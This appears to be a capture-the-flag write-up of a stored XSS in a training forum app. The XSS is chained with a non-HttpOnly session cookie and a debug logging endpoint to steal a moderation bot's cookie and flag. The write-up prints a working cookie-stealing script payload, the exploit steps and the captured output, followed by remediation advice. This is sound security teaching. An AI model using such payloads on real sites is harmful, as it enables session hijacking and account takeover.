# Stored XSS → Moderation-Bot Cookie Exfiltration

> Status: ☒ exploited ☒ explained
> Flag: `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}` (stolen from the moderation bot's own session cookie)
> WSTG: `WSTG-INPV-02` (Stored Cross-Site Scripting) — see [`00-recon/wstg-coverage.md`](../00-recon/wstg-coverage.md)

**In short:** the forum lets you post HTML, and it doesn't get cleaned up
before being shown to other people. Normally that's "just" stored XSS and you
need your own server somewhere to catch anything you steal with it. Here you
don't even need that: an automated bot opens every new thread with its own
real login, its cookie isn't protected from JavaScript, and the app itself
has a leftover logging endpoint that will hand your stolen data straight back
to you on request. Three small mistakes chain into one full account
takeover — of the bot.

## Where

- `POST /forum/new` — stores `content` with no HTML-escaping
- `GET /forum/<id>` — renders that `content` raw (the forum *listing* strips
  tags for its preview text; the individual post page does not)
- `GET|POST /api/collect?c=` — an unauthenticated debug endpoint that logs
  whatever you send it and replays the whole log back on a plain `GET`

## How it works

Three separate small issues, none of them the whole story on their own:

1. **The forum doesn't escape post content.** A dev comment on the page even
   jokes about it: *"someone subscribed with a `<script>` tag last week...
   it worked."* Post a `<script>` tag as your comment, and anyone who opens
   that specific post runs it in their browser.
2. **The session cookie isn't `HttpOnly`.** There's an open ticket about this
   (`#4201`) that's never been closed. Without that flag, `document.cookie`
   is readable by any script running on the page — including one you just
   planted.
3. **`/api/collect?c=` is a debug leftover.** Per the dev comments: *"left
   `/api/collect` up from when I was debugging the bot — it logs whatever
   you throw at `?c=` and hands it all back on GET."* No login needed to
   write to it or read it back.

None of these three is exploitable alone in an interesting way. Together:
post a script that reads its own `document.cookie` and sends it to
`/api/collect?c=...`, then just ask that same endpoint what it's collected —
no attacker-controlled server, no listener, nothing to set up.

The last piece is *who* actually runs the script: a moderation bot (a real
headless-Chrome instance, confirmed by its user-agent string) that opens
every new forum thread within seconds of it being posted, using its own
logged-in session. That's the session that ends up in the log — the
literal reason the bot cookie is worth stealing at all is that it's carrying
a cookie named `flag`.

## How we knew about `/api/collect`

We didn't guess it — the app disclosed it, and it surfaced during recon's
INFO-05 step (`00-recon/recon.sh` greps every page for HTML comments). The
forum pages' dev comments name the endpoint and describe its behavior:
*"left `/api/collect` up from when I was debugging the bot — it logs whatever
you throw at `?c=` and hands it all back on GET."* The same comments carry
the `<script>`-subscriber joke and the `#4201` HttpOnly ticket.

That claim was verified black-box before the exploit relied on it: `curl
"/api/collect?c=hello-test"`, then a plain `GET /api/collect` echoed it back
in the log with `from`/`ua` metadata — unauthenticated both ways. `/api/collect`
never appeared in any wordlist sweep (the route inventory in `00-recon`) —
the chain was: leaky source comments → cheap probe → exploit.

## Exploitation (step by step)

Run `./exploit.sh`:

1. **Log in** as `jdoe` (any real account works — this isn't privilege-
   specific).
2. **Post a new thread** whose content is:
   ```html
   <script>fetch("/api/collect?c="+encodeURIComponent(document.cookie))</script>
   ```
3. **Wait** — the moderation bot opens new threads on its own; no need to
   lure or notify it. In testing it showed up inside ~15 seconds.
4. **Read the loot** with a plain `GET /api/collect`:
   ```json
   {"captured":[
     {"data":"hello-test","from":"10.0.2.2","ua":"curl/8.21.0"},
     {"data":"session=eyJhbGciOi...; flag=FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}",
      "from":"127.0.0.1",
      "ua":"Mozilla/5.0 ... HeadlessChrome/120.0.6099.28 ..."}
   ]}
   ```
   The second entry is the bot: its user-agent gives it away, its `from` is
   `127.0.0.1` (it runs on the same box as the app, not somewhere remote),
   and its cookie header contains both a session JWT (`login: moderator,
   role: student`) and the flag itself.

```
FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}
```

## Impact

- **Full session takeover of the moderation bot's account** — its JWT is
  captured whole and can be replayed directly as a `session` cookie until it
  expires (same mechanic as [`jwt_fogery/`](../jwt_fogery/), just stolen
  instead of forged).
- **No attacker infrastructure required.** The exfil sink is the
  application's own public endpoint, which is a real severity bump over a
  textbook stored-XSS writeup — an attacker doesn't need to control a domain
  or server to receive stolen cookies, just to know `/api/collect` exists.
- **This is genuinely stored, not one-shot.** The payload sits on the forum
  and fires again for *every* future visitor who opens that thread — any
  logged-in student, not only the bot.
- Because the cookie isn't `HttpOnly`, this required zero cleverness beyond
  `document.cookie` — no cookie-jar tricks, no timing side-channels.

## Remediation

1. **HTML-escape all user-submitted content** before rendering it (forum
   post content here) — or run it through an explicit allow-list sanitizer
   if rich formatting is a real product requirement.
2. **Set `HttpOnly` (and `Secure`, `SameSite`) on the session cookie.** This
   one change alone would have stopped the theft even with the XSS still
   present.
3. **Remove `/api/collect`** before production, or at minimum require auth
   on it and stop echoing captured data back on `GET`.
4. **Add a `Content-Security-Policy`** restricting `script-src`/`connect-src`
   so an injected script can't reach arbitrary endpoints even if one slips
   through escaping.

## References

- WSTG: `WSTG-INPV-02` (Stored Cross-Site Scripting)
- OWASP Top 10: A03:2021 (Injection)
- Other: [`jwt_fogery/`](../jwt_fogery/) (what a stolen/forged session token
  gets you once you hold one); the cookie's missing `HttpOnly` flag is tracked
  as an open item under ticket `#4201` in the app's own dev comments.
  A second, separate reflected-XSS sink exists on `/newsletter`
  (unescaped in the "subscribed with: ___" banner) — confirmed live but not
  yet written up as its own breach.
